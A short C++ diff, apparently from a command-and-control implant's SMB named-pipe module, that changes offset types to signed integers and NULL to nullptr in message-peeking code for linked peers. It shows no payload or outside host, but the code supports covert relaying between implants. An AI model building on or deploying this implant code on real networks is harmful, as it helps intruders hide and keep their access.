@@ -366,20 +366,20 @@ namespace Smb {
         return true;
     }
 
-    BOOL PeekClientMessage(HANDLE handle, _stream &stream, uint32_t &offset) {
+    BOOL PeekClientMessage(HANDLE handle, _stream &stream, int32_t &offset) {
         HEXANE
 
         _stream header = { };
-        uint32_t current = 0;
+        int32_t current = 0;
         uint32_t read = 0;
 
         while (true) {
-            if (!Ctx->win32.PeekNamedPipe(handle, &header, sizeof(uint32_t) * 4, R_CAST(LPDWORD, &read), NULL, NULL) || read == 0) {
+            if (!Ctx->win32.PeekNamedPipe(handle, &header, sizeof(uint32_t) * 4, R_CAST(LPDWORD, &read), nullptr, 0) || read == 0) {
                 return false;
             }
 
             if (header.peer_id == Ctx->session.peer_id) {
-                uint32_t total = sizeof(uint32_t) * 4 + header.length;
+                int32_t total = sizeof(uint32_t) * 4 + header.length;
                 current += total;
 
                 SetFilePointer(handle, total, nullptr, FILE_CURRENT);
@@ -433,10 +433,10 @@ namespace Smb {
 
                 _stream *stream = R_CAST(_stream*, x_malloc(sizeof(_stream)));
                 _stream search  = { };
-                uint32_t offset = 0;
+                int32_t offset = 0;
 
                 while (PeekClientMessage(peer->ingress_handle, search, offset)) {
-                    SetFilePointer(peer->ingress_handle, offset, NULL, FILE_BEGIN);
+                    SetFilePointer(peer->ingress_handle, offset, nullptr, FILE_BEGIN);
 
                     if (!ProcessClientMessage(peer->ingress_handle, &stream)) {
                         x_free(stream);
